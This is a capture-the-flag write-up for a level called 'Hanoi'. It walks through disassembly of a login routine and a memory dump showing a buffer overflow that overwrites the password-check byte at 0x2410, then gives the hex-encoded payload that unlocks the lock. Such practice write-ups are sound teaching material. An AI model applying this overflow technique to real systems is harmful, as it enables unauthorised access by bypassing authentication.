Hanoi changes things up by having no visible hard-coded password
in order to surpass this, we'll have to start trying to break the rules
enter a new tool to utilize - the buffer overflow

Hanoi says passwords are between 8-16 characters, but is it really?

ex.

4520 <login>
4520:  c243 1024      mov.b	#0x0, &0x2410
4524:  3f40 7e44      mov	#0x447e "Enter the password to continue.", r15
4528:  b012 de45      call	#0x45de <puts>
452c:  3f40 9e44      mov	#0x449e "Remember: passwords are between 8 and 16 characters.", r15
4530:  b012 de45      call	#0x45de <puts>
4534:  3e40 1c00      mov	#0x1c, r14
4538:  3f40 0024      mov	#0x2400, r15          <<<<<
453c:  b012 ce45      call	#0x45ce <getsn>
4540:  3f40 0024      mov	#0x2400, r15
4544:  b012 5444      call	#0x4454 <test_password_valid>
4548:  0f93           tst	r15
454a:  0324           jz	$+0x8 <login+0x32>
454c:  f240 d600 1024 mov.b	#0xd6, &0x2410
4552:  3f40 d344      mov	#0x44d3 "Testing if password is valid.", r15
4556:  b012 de45      call	#0x45de <puts>
455a:  f290 0d00 1024 cmp.b	#0xd, &0x2410       <<<<<
4560:  0720           jnz	$+0x10 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
456e:  3041           ret
4570:  3f40 0145      mov	#0x4501 "That password is not correct.", r15
4574:  b012 de45      call	#0x45de <puts>
4578:  3041           ret

for this level, take notice of where our password entry gets stored
and where the final check is for a valid password. these 2 locations
are right next to each other, and thus if we are allowed to write outside
of our alloted space (i.e. our password is too long) we can force the check to pass.

in order to verify we can do this, lets just enter a password 17 characters long : aaaaaaaaaaaaaaaaaaf
> read 2400
2400 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
2410 6600 0000 0000 0000 0000 0000 0000 0000  f...............

and as we can see, we are able to write outside of our intended boundries
right into the final check of 0xd at 2410, and thus we have our solution(s)
as the only thing that matters is that there is a 0d at 2410

hex encoded password : 4141 4141 4141 4141 4141 4141 4141 4141 0d



